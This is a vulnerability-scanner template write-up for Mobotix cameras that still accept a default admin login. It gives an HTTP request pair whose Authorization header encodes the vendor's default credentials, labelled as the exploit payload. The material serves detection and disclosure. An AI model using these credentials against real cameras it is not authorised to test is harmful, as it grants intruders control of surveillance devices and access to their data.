# Nuclei Template: Mobotix - Default Login
**Template ID:** mobotix-default-credentials
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`mobotix-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Mobotix contains a default admin login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
GET /control/userimage.html HTTP/1.1
Host: {{Hostname}}

GET /control/userimage.html HTTP/1.1
Host: {{Hostname}}
Authorization: Basic YWRtaW46bWVpbnNt
```

## References
- https://www.mobotix.com/sites/default/files/2020-01/mx_RM_CameraSoftwareManual_en_200131.pdf
